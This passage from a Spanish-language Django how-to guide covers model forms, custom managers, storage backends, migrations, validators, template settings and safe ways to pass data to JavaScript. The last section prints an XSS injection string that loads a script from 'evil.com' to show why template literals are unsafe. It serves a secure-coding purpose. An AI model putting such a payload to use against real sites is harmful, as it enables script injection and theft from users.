base de datos**. De este manera, solo hay una forma posible de almacenar
que no tenemos datos para ese campo. *In the face of ambiguity, refuse
the temptation to guess*.

Cómo leer los valores pasados como parámetros en una URL
--------------------------------------------------------

Se usa el pseudo-diccionario ``GET``. Por ejemplo, si la URL era
``/search/?q=haha``, entonces se puede obtener el valor con:

.. code:: python

   request.GET.get('q', '')

Usar listas explicitas de campos
--------------------------------

Usar la opción ``fields`` de la clase ``Meta``, mejor que ``exclude``,
en un ``ModelForm``. De está forma estamos siendo explícitos en lo que
respecta a los campos que usará el formulario. Por la misma razón, no
usar nunca el valor especial ``__all__``.

No almacenar todos los ficheros subidos por usuario en la misma carpeta
-----------------------------------------------------------------------

Almacenar muchos ficheros en una misma carpeta es generalmente una mala
idea. Como el sistema necesita realizar una búsqueda para encontrar las
entrada en el directorio, esto significa que cuantas más entradas hay,
mas se tarda. Esto hace que el acceso sea más lento. Además, algunos
S.O. imponen un límite máximo al numero de entradas dentro de una
carpeta. Podemos evitar todos estos problemas usando, por ejemplo la
fecha de subida:

.. code:: python

   def get_upload_path(instance, filename):
       _now = now().date().strftime("%Y/%m/%d")
       return os.path.join('account/avatars/', _now, filename)

   class User(AbstractUser):
       avatar = models.ImageField(blank=True, upload_to=get_upload_path)

Cómo usar gestores personalizados (*Custom Manager*)
----------------------------------------------------

Podemos sacar funcionalidad de la clase modelo y ponerla en el gestor de
la clase. Esto simplifica la clase y permite reutilizar mejor el código.

Por ejemplo, podemos crear un gestor personalizado para una clase que
nos devuelva el *queryset* por defecto con un atributo aplicado (Usando
``anotate``) que lleve la cuenta de los registros en la base de datos:

.. code:: python

   class CustomManager(models.Manager):

       def with_comments_counter(self):
           return self.get_queryset().annotate(comments_count=Count('comment_set'))

Ahora podemos hacer:

.. code:: python

   posts = Post.objects.with_comments_counter()
   posts[0].comments_count

Como devolvemos un *queryset*, los resultados se pueden encadenar:

.. code:: python

   posts = Post.objects.with_comments_counter().filter(title__icontains='starman')
   posts[0].comments_count 

Source:
https://steelkiwi.com/blog/best-practices-working-django-models-python/

Cómo escribir un sistema de almacenamiento propio
-------------------------------------------------

Source: https://docs.djangoproject.com/en/3.2/howto/custom-file-storage/

If you need to provide custom file storage – a common example is storing
files on some remote system – you can do so by defining a custom storage
class. You’ll need to follow these steps:

Your custom storage system must be a subclass of
django.core.files.storage.Storage:

::

   from django.core.files.storage import Storage

   class MyStorage(Storage):
       ...

Django debe ser capaz de instanciar esta clase sin necesidad de ningún
parámetro. En caso necesario, lo recomendado es que lea esos valores
desde el fichero de configuración.

::

   from django.conf import settings
   from django.core.files.storage import Storage

   class MyStorage(Storage):
       def __init__(self, option=None):
           if not option:
               option = settings.CUSTOM_STORAGE_OPTIONS
           ...

Your storage class must implement the ``_open()`` and ``_save()``
methods, along with any other methods appropriate to your storage class.
See below for more on these methods.

In addition, if your class provides local file storage, it must override
the ``path()`` method.

Your storage class must be **deconstructible** so it can be serialized
when it’s used on a field in a migration. As long as your field has
arguments that are themselves serializable, you can use the
django.utils.deconstruct.deconstructible class decorator for this
(that’s what Django uses on FileSystemStorage).

By default, the following methods raise ``NotImplementedError`` and will
typically have to be overridden:

::

   Storage.delete()
   Storage.exists()
   Storage.listdir()
   Storage.size()
   Storage.url()

Note however that not all these methods are required and may be
deliberately omitted. As it happens, it is possible to leave each method
unimplemented and still have a working Storage.

By way of example, if listing the contents of certain storage backends
turns out to be expensive, you might decide not to implement
``Storage.listdir()``.

Another example would be a backend that only handles writing to files.
In this case, you would not need to implement any of the above methods.

Ultimately, which of these methods are implemented is up to you. Leaving
some methods unimplemented will result in a partial (possibly broken)
interface.

You’ll also usually want to use hooks specifically designed for custom
storage objects. These are:

::

   _open(name, mode='rb')

Required.

Called by ``Storage.open()``, this is the actual mechanism the storage
class uses to open the file. This must return a File object, though in
most cases, you’ll want to return some subclass here that implements
logic specific to the backend storage system.

::

   _save(name, content)

Called by ``Storage.save()``. The name will already have gone through
``get_valid_name()`` and ``get_available_name()``, and the content will
be a File object itself.

Should return the actual name of name of the file saved (usually the
name passed in, but if the storage needs to change the file name return
the new name instead).

::

   get_valid_name(name)

Returns a filename suitable for use with the underlying storage system.
The name argument passed to this method is either the original filename
sent to the server or, if ``upload_to`` is a callable, the filename
returned by that method after any path information is removed. Override
this to customize how non-standard characters are converted to safe
filenames.

The code provided on Storage retains only alpha-numeric characters,
periods and underscores from the original filename, removing everything
else.

::

   get_alternative_name(file_root, file_ext)

Returns an alternative filename based on the ``file_root`` and
``file_ext`` parameters. By default, an underscore plus a random 7
character alphanumeric string is appended to the filename before the
extension.

::

   get_available_name(name, max_length=None)

Returns a filename that is available in the storage mechanism, possibly
taking the provided filename into account. The name argument passed to
this method will have already cleaned to a filename valid for the
storage system, according to the ``get_valid_name()`` method described
above.

The length of the filename will not exceed ``max_length``, if provided.
If a free unique filename cannot be found, a ``SuspiciousFileOperation``
exception is raised.

If a file with name already exists, ``get_alternative_name()`` is called
to obtain an alternative name.

Como hacer migraciones propias
------------------------------

Podemos crear nuestras propias migraciones. Este es realmente útil para
cambios en las bases de datos que ya estén en producción.

Primero creamos una migración vacía (*empty*):

.. code:: shell

   ./manage.py makemigrations --empty --name nombre_que_quieras_para_la_migracion <app>

Esto creará un fichero de migración, que no hace nada, con un contenido
similar a este:

.. code:: python

   # Generated by Django 3.2.12 on 2022-03-22 09:04

   from django.db import migrations


   class Migration(migrations.Migration):

       dependencies = [
           ('agora', '0003_alter_table_add_field_flag'),
       ]

       operations = [
       ]

Como vemos, solo se define el campo de dependencias, las operaciones a
realizar en esta migración están vacías. Vamos a incluir código SQL para
crear la secuencia:

.. code:: sql

   CREATE SEQUENCE Agora.seq_foto_diputado START WITH 1 INCREMENT BY 1;

Para ello haremos uso de la clase
`migration.RunSQL <https://docs.djangoproject.com/en/1.10/ref/migration-operations/#runsql>`__,
que nos permite definir la migración tanto en una dirección como en
otra, es decir, crearemos este objeto con dos sentencias SQL, una para
definir como aplicar la migración, y otra para deshacerla. En nuestro
caso, quedaría así:

.. code:: python

   # Generated by Django 3.2.12 on 2022-03-22 09:04

   from django.db import migrations


   class Migration(migrations.Migration):

       dependencies = [
           ('agora', '0003_asunto_bop_cargo_claseiniciativa_composicion_diputado_diputadogrupo_ds_dsc_dsdp_fotodiputado_grupopa'),
       ]

       operations = [
           migrations.RunSQL(
               'CREATE SEQUENCE Agora.seq_foto_diputado START WITH 1 INCREMENT BY 1',
               'DROP SEQUENCE Agora.seq_foto_diputado',
           )
       ]

Fuentes:

-  `Executing Custom SQL in Django Migrations \| End Point
   Dev <https://www.endpointdev.com/blog/2016/09/executing-custom-sql-in-django-migration/>`__

Cómo crear migraciones propias usando código Python en vez de SQL
-----------------------------------------------------------------

Si las migraciones usando solo SQL se quedan cortas, también podemos
hacer migraciones personalizadas que usen código Python e incluso, con
ciertas limitaciones, nuestro código ya existente.

Para ello, en vez de usar la clase ``RunSQL`` usaremos la clase
``RunPython``. Esta clase espera un *callable*, normalmente una función.
Esta función debe aceptar dos parámetros: el primero es un registro que
mantiene los versiones a lo largo de la historia de todos los modelos,
de forma que podamos acceder al modelo tal y como era en la evolución
del proyecto. El segundo parámetro es una instancia de a clase
``SchemaEdior``, que se puede usar para realizar cambios manuales en el
esquema de la base de datos (Pero que no es recomendable usar, ya que
puede confundir, y mucho, al sistema de migraciones).

Veamos un ejemplo, en el que calculamos la letra inicial, normalizada,
de un texto y lo almacenamos en otro campo. Esto puede ser útil a
efectos de filtrar y clasificar las entradas:

.. code:: py

   from django.db import migrations


   def make_inicial(text):
       if text:
           normaliza_table = str.maketrans("ÁÉÍÓÚ", "AEIOU")
           char = text[0].upper()
           return char.translate(_normaliza_table)
       return ''


   def set_inicial(apps, schema_editor):
       # No podemos usar el modelo Entrada directamente, porque puede
       # que a estas alturas exista una version posterior al modelo
       # que espera la migración. Por eso tenemos que _viajar en el tiempo_
       # y cargar elmodelo que se corresponda con el momento histórico
       # de esta migración.
       Ejemplo = apps.get_model("dc2", "Ejemplo")
       for ejemplo in Ejemplo.objects.filter(inicial=None):
           ejemplo.inicial = make_inicial(ejemplo.entrada)
           ejemplo.save()


   class Migration(migrations.Migration):
       dependencies = [
           ("dc2", "0001_initial"),
       ]

       operations = [
           migrations.RunPython(set_inicial),
       ]

Al igual que con ``RunSQL``, podemos implementar la operación que
deshaga este cambio, y pasarla como segundo parámetro. Si hacemos esto
con todas nuestras migraciones personales (Las automáticas lo realizan
siempre), podemos viajar atrás y adelante en la historia del esquema de
la base de datos, que puede ser una capacidad interesante. Para el
ejemplo anterior, quedaría así:

.. code:: py

   from django.db import migrations


   def make_inicial(text):
       if text:
           normaliza_table = str.maketrans("ÁÉÍÓÚ", "AEIOU")
           char = text[0].upper()
           return char.translate(_normaliza_table)
       return ''


   def set_inicial(apps, schema_editor):
       # No podemos usar el modelo Entrada directamente, porque puede
       # que a estas alturas exista una version posterior a el modelo
       # que espera la migración. Por eso tenemos que _viajar en el tiempo_
       # y cargar elmodelo que se corresponda con el momento histórico
       # de esta migración.
       Ejemplo = apps.get_model("dc2", "Ejemplo")
       for ejemplo in Ejemplo.objects.filter(inicial=None):
           ejemplo.inicial = make_inicial(ejemplo.entrada)
           ejemplo.save()


   def unset_inicial(apps, schema_editor):
       Ejemplo = apps.get_model("dc2", "Ejemplo")
       for ejemplo in Ejemplo.objects.exclude(inicial=None):
           ejemplo.inicial = None
           ejemplo.save()



   class Migration(migrations.Migration):
       dependencies = [
           ("dc2", "0001_initial"),
       ]

       operations = [
           migrations.RunPython(set_inicial, unset_inicial),
       ]

Como condensar/simplificar (*squash*) las migraciones en Django
---------------------------------------------------------------

Existe una opción en el ``manage.py`` llamada **``squashmigrations``**
que nos permite condensar todas las migraciones aplicadas (o un
subconjunto de ellas) de forma que se sustituyan por una única
migración. Además, intenta optimizar las migraciones al mezclarlas, de
forma que se eliminan los cambios que son sobrescritos por migraciones
posteriores.

Por ejemplo, si tenemos una acción de tipo ``CreateModel()`` y más tarde
aparece otra de tipo ``DeleteModel()`` para el mismo modelo, se pueden
eliminar no solo las dos acciones indicadas, sino también cualquier
acción intermedia que modifique al modelo.

Igualmente, acciones como ``AlterField()`` o ``AddField()`` son
trasladadas a la versión final de la acción ``CreateModel``.

La versión final condensada también mantiene referencias al conjunto de
migraciones que reemplaza. De esa forma Django puede entender cosas como
el histórico de grabaciones o las dependencias entre migraciones.

Django enumera de forma automática los ficheros de migraciones,
partiendo de ``0001_initial.py``. De esa forma puede determinar el orden
de aplicación de las migraciones, y nosotros podemos usarlo para indicar
el conjunto de las migraciones que queremos condensar, en forma de
rango.

Por ejemplo, supongamos que tenemos la siguiente lista de migraciones:

::

   ./foo
       ./migrations
           0001_initial.py
           0002_userprofile.py
           0003_article_user.py
           0004_auto_20190101_0123.py

En la mayoría de los casos, querríamos condensarlas todas en un único
fichero. Para ello, ejecutamos la siguiente orden:

.. code:: shell

   python manage.py squashmigrations foo 0004

El resultado será condensar todas las migraciones, desde la 1 hasta la
4, generando una nueva migración con el nombre:
``0001_squashed_0004_auto_<timestamp>.py``

Si examinamos este fichero, descubriremos dos cosas interesantes:

-  La nueva migración está marcada como ``initial=True``, lo que
   significa que sera la nueva migración inicial de esta aplicación. Si
   se aplicara en una nueva base de datos, las migraciones anteriores se
   ignorarían.

-  Se ha añadido un nuevo atributo, ``replaces``, que es una lista de
   las migraciones que son reemplazadas por esta.

Fuentes:

-  `How to Squash and Merge Django Migrations ·
   Coderbook <https://coderbook.com/@marcus/how-to-squash-and-merge-django-migrations/>`__

Cómo saber que base de datos se corresponde con cada modelo
-----------------------------------------------------------

Si usamos *routers* para trabajar con múltiples bases de datos, hay una
forma de preguntar, para un modelo dado y con la configuración definida
en ``settings.DATABASE_ROUTERS``, qué base de datos le corresponde.
Además, la base de datos puede ser diferente según queramos leer o
escribir en ella.

Llamando a ``django.db.router.db_for_read`` y pasándole el modelo, nos
devuelve la entrada en ``settings.DATABASES`` a usar para leer. De forma
equivalente, llamando a ``django.db.router.db_for_write`` con el modelo
nos dirá la entrada correspondiente a la base de datos a usar para
escribir ese modelo.

.. code:: python

   from django.db import router

   from app.models import ModelAlfa

   assert router.db_for_read(ModelAlfa) == 'default'
   assert router.db_for_write(ModelAlfa) == 'default'

Cómo prevenir que el método ``save`` de un ModelForm modifique la BD
--------------------------------------------------------------------

A veces queremos hacer un tratamiento previo a una instancia de un
modelo y necesitamos hacerlo **antes** de que se almacene en la base de
datos. La solución es llamar al método ``save`` del formulario usando el
parámetro opcional ``commit``. El parámetro ``commit`` es un valor
booleano que por defecto vale ``True``.

Si llamamos a ``save`` con ``commit`` a ``False``, el formulario crea
una instancia del modelo en memoria, pero **no la salva en la base de
datos**.

Obviamente, es importante que en algún momento posterior salvemos
nosotros la instancia en la base de datos, lo que implica llamar a
``save`` con ``commit`` a ``True``.

Fuente: `Creating forms from models \| Django
documentation <https://docs.djangoproject.com/en/4.1/topics/forms/modelforms/#the-save-method>`__

Cómo serializar un queryset
---------------------------

Los *QuerySets* se pueden serializar con
`pickle <https://docs.python.org/3/library/pickle.html>`__, y esto
conlleva que la consulta es ejecutada y todos los resultados son
almacenados también en la serializacion. Esto puede ser útil a efectos
de *cachear* el *queryset*.

Obviamente, al recuperar el resultado, los registros obtenidos pueden
diferir de los almacenados en ese momento en la base de datos.

Si quieres almacenar solo la información necesaria para recrear el
*queryset*, podemos serializar solo la propiedad ``query``. Para recrear
el *queryset*, haríamos algo como esto:

.. code:: python

   import pickle

   qs = MyModel.objects.all()
   qs.query = pickle.loads(s)     # Assuming 's' is the pickled string.

.. warning:: Atención a las versiones

   Como todo lo que se serializa con `pickle`, no se puede compartir
   entre versiones de Python, pero este truco con las queries
   serializadas es aun más estricto: **No se puede compartir estos
   datos entre versiones diferentes de Django**.

Cómo usar las validaciones en los formularios
---------------------------------------------

Los formularios de Django soportan el uso de unas funciones/clases de
validación, que en la documentación se denominan ``validators``, en
español, validadores. Un **validador** es simplemente una función (o un
objeto *callable*) que acepta un parámetro de entrada y cuyo
comportamiento es:

-  No devuelve nada, si el dato es correcto

-  Eleva la excepción ``ValidationError`` (o una clase derivada de esta)
   si no es correcto. La excepción está definida en
   ``django.core.exceptions``.

Podemos asignar varias validadores a un solo campo. La forma más fácil
es usar el parámetro ``validators``, que acepta una lista de validadores
a aplicar.

El siguiente validador solo acepta valores pares:

.. code:: python

   from django.core.exceptions import ValidationError

   def validate_is_even(value):
       if value % 2 != 0:
           raise ValidationError(f'{value} is not an even number')

El siguiente ejemplo muestra como se añade este validador a un campo de
un formulario:

.. code:: python

   from django import forms

   class MyForm(forms.Form):
       even_field = forms.IntegerField(validators=[validate_is_even])

Los validadores también se pueden aplicar a los modelos:

::

   from django.db import models

   class MyModel(models.Model):
       even_field = models.IntegerField(validators=[validate_is_even])

La mayor parte de las clases de campos de formularios tienen una serie
de validadores predefinidos. Por ejemplo ``SlugField`` viene de serie
con el validador ``validate_slug``.

En Django se define la clase ``RegexValidator``, que nos permite crear
un validador a partir de una expresión regular. Para ello instanciaremos
un objeto desde la clase ``RegexValidator``, cuyo constructor acepta los
siguientes parámetros:

-  ``regex``: La expresión regular. Puede ser una cadena de texto o un
   expresión regular ya compilada. El valor por defecto es la cadena
   vacía, lo que no tiene mucha utilidad porque casaría con cualquier
   cosa.

-  ``message``: El mensaje con el que se creara la excepción, en caso de
   ser necesario. Si no se especifica, el valor por defecto es
   ``"Enter a   valid value"``.

-  ``code``: El código de error usado en la excepción en caso de fallo.
   El valor por defecto es ``'invalid'``.

-  ``flags``: Los valores opcionales para la definición de patrón, si lo
   hemos definido con una cadena de texto.

Otras clases generadoras de validadores predefinidas en Django son:

-  ``EmailValidator``. Permite definir opcionalmente una lista de
   dominios válidos con el parámetro ``allowlist``.

-  ``URLValidator``. Permite definir opcionalmente los esquemas
   (``http``/``https``) aceptados.

-  ``MaxValueValidator``

-  ``MinValueValidator``

-  ``MaxLengthVaidator``

-  ``MinLengthVaidator``

-  ``DecimalValidator``

-  ``FileExtensionValidator``

Django tiene varios validadores predefinidos, normalmente usado por
determinados campos que los necesitan por defecto:

-  ``validate_email`` (Una instancia sin parametrizar de
   ``EmailValidator``)

-  ``validate_slug``

-  ``validate_unicode_slug``

-  ``validate_ipv4_address``

-  ``validate_ipv6_address``

-  ``validate_ipv46_address``

-  ``validate_comma_separated_integer_list``

-  ``int_list_validator``

-  ``validate_image_file_extension``

Cómo tener dos aplicaciones con el mismo nombre
-----------------------------------------------

Desde Django 1.7, es obligatorio que las aplicaciones tengan una
**etiqueta única** para identificarlos. Por defecto la etiqueta es el
nombre del módulo, así que si tenemos dos módulos con el mismo nombre,
``foo``, aunque están obviamente en ramas diferentes, tendremos un
error.

La solución es **sobreescribir** la **etiqueta** por defecto. Podemos
hacerlo añadiendo el siguiente código al fichero ``apps.py`` de la
aplicación (Ojo, que el valor importante es ``label``, no ``name``):

.. code:: python

   # foo/apps.py

   from django.apps import AppConfig

   class FooConfig(AppConfig):
       name = 'full.python.path.to.your.app.foo'
       label = 'my.foo'  # <-- this is the important line - change it to anything oth

La finalidad del fichero ``apps.py`` es permitir configurar y definir
determinados parámetros o atributos de la aplicación. Según la
documentación:

   Los objetos de tipo ``AppConfig`` almacenan *metadatos* relativos a
   una aplicación. Algunos de estos valores pueden ser modificados
   definiendo una subclase de ``AppConfig``, mientras que otros se
   definen por Django y son de solo lectura.

En Django 4.x las plantillas se cachean si DEBUG=true
-----------------------------------------------------

Todas las plantillas se cachean por defecto en Django a partir de la
version 4, si el valor de ``settings.DEBUG`` es verdadero.

De las notas de la version 4.1:

   The cached template loader is now enabled in development, when
   ``DEBUG`` is True, and ``OPTIONS['loaders']`` isn’t specified. You
   may specify ``OPTIONS['loaders']`` to override this, if necessary.

La solución es:

.. code:: py

   default_loaders = [
       "django.template.loaders.filesystem.Loader",
       "django.template.loaders.app_directories.Loader",
   ]

   cached_loaders = [("django.template.loaders.cached.Loader", default_loaders)]

   TEMPLATES = [
       {
           "BACKEND": "django.template.backends.django.DjangoTemplates",
           "DIRS": [os.path.join(BASE_DIR, "templates")],
           "OPTIONS": {
               "context_processors": [
                   "django.template.context_processors.debug",
                   "django.template.context_processors.request",
                   "django.contrib.auth.context_processors.auth",
                   "django.contrib.messages.context_processors.messages",
               ],
               "loaders": default_loaders if DEBUG else cached_loaders,
           },
       },
   ]

Fuente: `Django 4.1+ HTML Templates Are Cached by Default with DEBUG =
True — Nick
Janetakis <https://nickjanetakis.com/blog/django-4-1-html-templates-are-cached-by-default-with-debug-true>`__

Cómo incluir etiquetas y filtros propios en el sistema de plantillas
--------------------------------------------------------------------

Para no tener que usar ``{% load ... %}`` todo el rato.

Podemos añadir nuestros componentes en la opcion ``builtins`` de la
variable ``TEMPLATES``, en el ``settings.py``:

.. code:: py

   TEMPLATES = [
       {
           ...,
           'OPTIONS': {
               'context_processors': [
                   ...
               ],
               'builtins': [
                   'django_components.templatetags.component_tags',
               ]
           },
       },
   ]

Para qué sirve la variable ``STATIC_ROOT``/``STATIC_FILES_DIR``
---------------------------------------------------------------

La respuesta es diferente según estemos en desarrollo o en producción.

En desarrollo, ``STATIC_ROOT`` no se usa para nada. Solo se usa en
producción. Cuando estamos en desarrollo (Es decir, cuando
``settings.DEBUG`` está a ``True``) no hace falta ni que la definamos;
Django buscará los contenidos estáticos dentro de la carpeta de la
``app`` y los servirá directamente, cortesía de la magia del comando
``runserver``.

En producción, sin embargo, lo más probable es que queramos servir los
contenidos estáticos usando Nginx o Apache, por ejemplo, ya que es una
forma mucho más eficiente de hacerlo y además descargamos a Django de
ese trabajo. En en estos casos en los que resulta útil ``STATIC_ROOT``.
Nginx o Apache no saben nada del proyecto Django, solo saben que tiene
que servir unos ficheros que están en un determinado directorio.

Si ajustando el valor de ``STATIC_ROOT`` a ese directorio, digamos:

.. code:: py

   STATIC_ROOT = '/algun/directorio/por/ahi/'

Podemos ahora configurar Nginx/Apache para que sirva los contenidos de
ese mismo directorio.

Al ejecutar ``manage.py collectstatic``, Django buscará en todas las
carpetas ``static`` que hay dentro de todas las ``apps`` y los copiará a
la carpeta ``/algun/directorio/por/ahi/``.

La variable ``STATICFILES_DIRS`` sirve para incluir directorios
adicionales que el comando ``collectstatic`` también debe procesar. Una
practica habitual es incluir aquí los contenidos estáticos que sean
comunes a todo el proyecto, por ejemplo ``main/static`` (Suponiendo que
``main`` es la carpeta donde está el fichero ``settings.py``, el
``urls.py`` principal, etc). Esta carpeta **no** es una ``app``, por lo
que simplemente crear una subcarpeta ``static`` no copiará los ficheros
que haya dentro a ``STATIC_ROOT``.

Fuente: `python - Differences between STATICFILES_DIR, STATIC_ROOT and
MEDIA_ROOT - Stack
Overflow <https://stackoverflow.com/questions/24022558/differences-between-staticfiles-dir-static-root-and-media-root>`__

La tabla de sesiones de Django no para de crecer, como puedo solucionarlo
-------------------------------------------------------------------------

Efectivamente,la tabla de sesiones no se limpia sola, están registradas
todas las sesiones, incluyendo las expiradas, por lo que la tabla no
para de crecer. Esto se puede solucionar bien desde la propia base de
datos (Este ejemplo usa MySQL):

.. code:: sql

   DELETE FROM mydatabase.django_session where expire_date < now()

O, seguramente mejor, usando el comando que define Django expresamente
para esto:

.. code:: shell

   python manage.py clearsessions

Lo mejor es poner uno de estos comandos en nuestro *crontab*, y que se
ejecute cada día, por ejemplo. El comando no borra las sesiones que
sigan activas, solo las que se han caducado.

Fuente: `Why django session table growing automatically - Stack
Overflow <https://stackoverflow.com/questions/71441352/why-django-session-table-growing-automatically>`__

Cómo especificar, para un modelo, el nombre de la tabla en la BD
----------------------------------------------------------------

Usando el atributo ``db_table`` de la clase ``Meta`` de modelo:

.. code:: python

   class TempUser(models.Model):
       
       class Meta:
           db_table = "temp_user"

       username = models.CharField(max_length=100)
       first_name = models.CharField(max_length=100)
       last_name = models.CharField(max_length=100)
       ...

Cómo especificar, para un campo de un modelo, el nombre de la columna en la BD
------------------------------------------------------------------------------

Con el parámetro ``db_column`` a la hora de definir el campo:

.. code:: python

   class User(models.Model):
       
       login = models.CharField(max_length=100, db_column='username')
       ...

Cómo subir contenido a un campo de tipo FileFied, por programa
--------------------------------------------------------------

Podemos usar el objeto ``File`` de ``django.core.files``. Supongamos un
modelo:

.. code:: py

   class MyModel(models.Model):
     document = models.FileField(upload_to=PATH)

Podemos hacer:

.. code:: py

   from django.core.files import File

   doc = MyModel()
   with open(filepath, 'rb') as doc_file:
      doc.document.save(filename, File(doc_file), save=True)
   doc.save()

Fuente: `Programmatically Upload Files in Django - Stack
Overflow <https://stackoverflow.com/questions/1993939/programmatically-upload-files-in-django>`__

Crear un FormField (y Widget por defecto, si fuera necesario) propio
--------------------------------------------------------------------

Los campos **de formulario** son fáciles de personalizar:

.. code:: py

   class UpperCaseField(forms.CharField):
       def clean(self, value)
           try:
               return value.upper()
           except:
               raise ValidationError

Solo tenemos que crear una nueva clase que derive del campo de
formulario que más se parezca al que necesitamos y reimplementar el
método ``clean()`` para que devuelva el valor y tipo de dato que
necesitamos.

Si tuviéramos que reimplementar también el método ``__init__`` hay que
seguir aceptando todos los parámetros básicos: ``required``, ``label``,
``initial``, ``widget`` y ``help_text``. La forma más sencilla es
llamando a ``super().__init__``.

.. code:: py

   class MyObjectField(forms.ModelChoiceField):
       # in this case, 'value' is a string representing
       # the primary key of a MyObject
       def clean(self, value):
           try:
               return MyObject.objects.get(pk=value)
           except:
               raise ValidationError

De igual manera, hay que tener cuidado al reimplementar ``clean`` porque
este es responsable de llamar a ``to_python()``, ``validate()`` y
``run_validators()``. Lo más seguro es llamar a la super implementación
con ``super().clean(value)``, antes y/o después de lo que tengamos que
hacer nosotros.

Esto es solo para personalizar los campos de formulario. para
personalizar los *Widgets*, se requiere un poco más de trabajo porque
hay que reimplementar unos cuantos métodos más.

Mostrar el mensaje de ayuda (``help``) escribiendo comandos de Django
---------------------------------------------------------------------

Puedes llamar al método ``self.print_help``. Por ejemplo:

.. code:: python

       def handle(self, *args, **options):
           items = [x.lower() for x in set(args)]
           if not items:
               self.print_help('manage.py', '<your command name>')
               sys.exit(1)

Fuentes:

-  `python - Show help for command from within Django management command
   - Stack
   Overflow <https://stackoverflow.com/questions/58127109/show-help-for-command-from-within-django-management-command>`__

-  `How to Create Custom Django Management
   Commands <https://simpleisbetterthancomplex.com/tutorial/2018/08/27/how-to-create-custom-django-management-commands.html>`__

¿Cuál es la utilidad de la variable ``app_name`` en el fichero ``urls.py``?
---------------------------------------------------------------------------

Cuando vamos a hacer un ``include`` de una fichero ``urls.py`` dentro de
otro, hay dos formar de definir el **espacio de nombres** o
**``namespace``**.

Uno es usando el parámetro ``namespace`` en la llamada a ``include``. Si
no se especifica, tomará como valor por defecto el nombre de la
aplicación en la que esta definido el fichero ``urls.py``. Eso implica
que el ``namespace`` de una *app* será por defecto el de la misma
``app``.

El segundo método es definiendo una variable en el fichero ``urls.py``
que se llame ``app_name``, en el mismo *scope* que ``url_patterns``.

El segundo método es ahora mismo el recomendado.

-  `Documentaión de
   Django <https://docs.djangoproject.com/en/dev/topics/http/urls/#url-namespaces-and-included-urlconfs>`__

¿Para qué sirve la clase AppConfig?
-----------------------------------

Django mantien un **registro de aplicaciones instaladas**. En ese
registro se almacena aspectos de la configuración de cada *app*. El
registro se llama ``apps`` y vive en ``django.apps``:

.. code:: python

   from django.apps import apps
   print(apps.get_app_config('admin').verbose_name)

**No** existe en Django una clase ``Aplicction`` que reprsente la *app*
en si, pero lo que más se parece serian los objetos que se almacenan en
este repositorio, que son instancias (directa o indirectamente) de
``AppConfig``.

Para configurar una aplicación, tenemos que crear un fichero
``apps.py``, y dentro del mismo definir una clase de ``AppConfig`` (La
utilidad de línea ``startapp`` crea una automáticamente). Para cualquier
entrada en ``INSTALLED_APPS``, si es una especificación de ruta al
estilo Python (Con puntos ``.`` en vez del separador de direcotorios),
Django busca dentro de esa ruta el fichero ``apps.py`` y, sii lo
encuentra, busca que haya una única clase derivada de ``AppConfig``. Si
encuentra una y solo una, se usa esa clase para configurar la
aplicación. Si encuentra varias, Django buscara la que tenga la
propiedad ``default`` a ``True``. Si no se encuentra ninguna, se usará
la clase base ``AppConfig``.

De forma alternativa, podemos tener en la lista ``INSTALLED_APPS``
directamente especificada la clase de configuracion. Por ejemplo:

.. code:: python

   INSTALLED_APPS = [
       ...
       'polls.apps.PollsAppConfig',
       ...
   ]

Las características más interesantes que hay que definir en esta clase
son:

-  El **identificador** de la *app*, que definiremos con el atributo
   ``name``

-  El **nombre publido**, que definiremos con ``verbose_name``.

Por ejemplo, si tenemos el fichero ``rock_n_roll/apps.py``:

::

   # rock_n_roll/apps.py

   from django.apps import AppConfig

   class RockNRollConfig(AppConfig):
       name = 'rock_n_roll'
       verbose_name = "Rock ’n’ roll"

Cuando Django encuentre la etiqueta ``rock_n_roll``, se usara como
configuración la de esta clase.

Cómo pasar datos de forma segura desde Django a Javascript
----------------------------------------------------------

Hay dos técnicas:

-  Usar atributos en marcas Html para datos sencillos
-  Usar ``json_script`` para datos complejos

La primera idea puede ser la de usar el propio sistema de plantillas de
Django, por ejemplo, haciendo:

.. code:: html

   {# DON’T DO THIS #}
   <script>
       const username = "{{ username }}";
   </script>

Es mejor **evitar siempre esta opción**. Django por defecto escapa los
valores en las plantillas, así que si ``username`` fuera, por ejemplo
``"Adam <3"``, la salida en la plantilla sería:

.. code:: html

   <script>
       const username = "Adam &lt;3";
   </script>

Otro peligro relacionado con esto sería la posibilidad de `inyección de
código <https://es.wikipedia.org/wiki/Inyecci%C3%B3n_de_c%C3%B3digo>`__,
especialmente si se usan `plantillas literales de
javascript <https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals>`__.
En el siguiente ejemplo:

.. code:: html

   {# DON’T DO THIS #}
   <script>
       const greeting = `Hi {{ username }}`;
   </script>

Un visitante malicioso podría incluir una comilla invertida para
terminar el literal, y añadir su propio código. Por ejemplo, si el valor
de ``username`` fuera:

.. code:: js

   a`; document.body.appendChild(document.createElement(`script`)).src = `evil.com/js`;`

Entonces la salida final sería:

.. code:: html

   <script>
       const greeting = `Hi a`; document.body.appendChild(document.createElement(`script`)).src = `evil.com/js`;``;
   </script>

El sistema de plantillas de Django está pensado para escapar Html, no
para *Javascript*, que tiene un sintaxis mucho más compleja.

Descartado esto, veamos pues las dos opciones que tenemos:

Usar atributos de datos en etiquetas Html
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Para datos simple, se pueden usar `atributos de
datos <https://developer.mozilla.org/en-US/docs/Learn/HTML/Howto/Use_data_attributes>`__,
que son atributos genéricos cuyo nombre empiece por ``data-``. Por
ejemplo:

.. code:: html

   <script data-username="{{ username }}">
       const data = document.currentScript.dataset;
       const username = data.username;
   </script>

Con ``document.currentScript`` podemos acceder simple y rápidamente a
los atributos de datos del *script* actual. La propiedad ``dataset``
contiene los valores pasados en forma de texto. Esto puede ser usado
también con ficheros en *scripts* de javascript independientes:

.. code:: html

   {% load static %}
   <script src="{% static 'index.js' %}"
           defer
           data-username="{{ username }}"></script>

Que se leería de la misma manera:

.. code:: js

   const data = document.currentScript.dataset;
   const username = data.username;

.. warning:: Los nombres de los atributos de datos

   La propiedad ``dataset`` convierte de ``kebab-case`` a ``camelCase``.
   Por ejemplo el atributo ``data-full-name`` se accede como
   ``fullName``.  Ojo con eso.

.. warning:: Los atributos de datos son siempre texto

   En ``dataset`` solo hay texto. Si necesitamos pasar a otro tipo de
   datos, como entero o booleano, tenemos que parsearlo nosotros.

No hay límite al numero de atributos de datos que podemos pasarle a un
*script*:

.. code:: html

   {% load static %}
   <script src="{% static 'index.js' %}"
           defer
           data-settings-url="{% url 'settings' %}"
           data-configuration-url="{% url 'configuration' %}"
